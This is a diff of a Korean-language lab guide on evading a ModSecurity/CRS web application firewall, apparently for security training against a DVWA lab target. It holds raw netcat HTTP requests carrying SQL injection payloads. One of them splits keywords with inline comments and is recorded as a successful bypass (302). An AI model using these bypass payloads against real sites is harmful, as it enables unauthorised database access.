@@ -194,11 +194,11 @@ graph TD
 
 ```bash
 # 케이스 변형 → 403 (정규화)
-curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UnIoN%20SeLeCt%20pass"   # 403
+echo -en "GET /?id=1%20UnIoN%20SeLeCt%20pass HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'   # 403
 # 주석 키워드 '사이' → 403 (주석 제거 후 키워드 온전)
-curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%2F**%2FUNION%2F**%2FSELECT" # 403
+echo -en "GET /?id=1%2F**%2FUNION%2F**%2FSELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}' # 403
 # 키워드 '내부' 분할 → 302 (libinjection 토큰화 실패 = 우회)
-curl -s -o /dev/null -w "%{http_code}" -H "Host: dvwa.el34.lab" "http://10.20.30.1/?id=1%20UN/**/ION%20SE/**/LECT%20pass" # 302
+echo -en "GET /?id=1%20UN/**/ION%20SE/**/LECT%20pass HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n" | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}' # 302
 ```
 
 케이스·주석사이·이중인코딩은 **403**(정규화가 표준형으로 복원해 차단), 게다가 CRS는 **이상 점수**로 약한
@@ -264,7 +264,7 @@ graph TD
 ## 5. 실습 안내 (8 미션)
 
 각 미션을 **① 왜 하는가 / ② 무엇을 알 수 있는가 / ③ 결과 해석 / ④ 실전 활용** 4축으로 설명한다. 명령은
-el34 호스트에서 `docker exec el34-attacker` 로. **인가된 표적(10.20.30.1)에만.** 차단(403)도 유효한 학습
+공격자 VM(`ssh att@192.168.0.202`)에서 실행한다. **인가된 표적(10.20.30.1)에만.** 차단(403)도 유효한 학습
 결과 — naive 우회의 실패를, 그리고 키워드 내부 분할의 우회(302)를 실측한다.
 
 ### STEP 1 — 베이스라인
